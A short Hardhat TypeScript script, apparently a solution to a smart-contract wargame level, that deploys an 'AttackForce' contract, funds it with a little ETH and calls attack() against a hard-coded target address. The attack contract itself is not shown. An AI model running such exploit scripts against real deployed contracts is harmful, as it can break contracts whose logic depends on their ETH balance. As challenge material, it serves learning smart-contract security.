import { ethers } from "hardhat";
import { AttackForce__factory } from "../typechain-types";
import * as dotenv from "dotenv"
dotenv.config()


const TARGET_CONTRACT_ADDRESS = "0x33312B8789CAA5F2567898603d411B40c5DBF395"

async function main() {
    const wallet = new ethers.Wallet(process.env.PRIVATE_KEY ?? "")
    const provider = new ethers.providers.JsonRpcProvider(
        process.env.ALCHEMY_HTTPS_API_KEY
    )
    const signer = wallet.connect(provider)

    const attackContractFactory = new AttackForce__factory(signer);
    const attackContract = await attackContractFactory.deploy();

    console.log("Depositing ETH to contract...")
    const depositTx = await attackContract.deposit({
        value: ethers.utils.parseEther("0.0005")
    });
    await depositTx.wait();

    console.log("Calling attack()...")

    const tx = await attackContract.attack(TARGET_CONTRACT_ADDRESS);
    await tx.wait();
    console.log(`Attack was successful!`)
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});